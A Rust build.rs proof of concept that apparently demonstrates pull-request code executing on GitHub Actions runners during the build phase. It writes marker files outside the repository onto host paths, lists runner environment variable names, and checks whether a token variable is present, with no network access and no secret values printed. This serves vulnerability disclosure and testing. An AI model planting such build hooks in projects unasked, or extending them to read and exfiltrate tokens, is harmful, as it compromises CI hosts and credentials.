// PoC marker build script — demonstrates PR-authored code executing in the
// BUILD phase on whatever host runs this job. Harmless by construction:
// writes marker files, lists env var NAMES only (no values, no network).
use std::env;
use std::fs;
use std::path::PathBuf;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    let run = env::var("GITHUB_RUN_ID").unwrap_or_else(|_| "local".into());
    let marker = format!("POC-MARKER build.rs executed, run {}\n", run);

    // 1. inside the build dir (normal, expected)
    if let Ok(out) = env::var("OUT_DIR") {
        let _ = fs::write(PathBuf::from(out).join("marker.txt"), &marker);
    }
    // 2. the job workspace itself
    let _ = fs::write("POC-MARKER-workspace.txt", &marker);
    // 3. the runner work root (parent of the repo checkout — host filesystem)
    if let Ok(w) = env::var("GITHUB_WORKSPACE") {
        let _ = fs::write(PathBuf::from(&w).join("..").join("POC-MARKER-runner-workroot.txt"), &marker);
    }
    // 4. RUNNER_TEMP — a host path outside the repo
    if let Ok(t) = env::var("RUNNER_TEMP") {
        let _ = fs::write(PathBuf::from(t).join("POC-MARKER-runner-temp.txt"), &marker);
    }

    // env var NAMES visible to PR code on this runner host (no values)
    let names: Vec<String> = env::vars()
        .map(|(k, _)| k)
        .filter(|k| k.starts_with("GITHUB_") || k.starts_with("RUNNER_") || k.starts_with("Actions"))
        .collect();
    println!("POC-MARKER env names visible to PR build code: {:?}", names);
    println!("POC-MARKER token env present: {}",
        env::var("GITHUB_TOKEN").is_ok() || names.iter().any(|n| n.contains("TOKEN")));
}
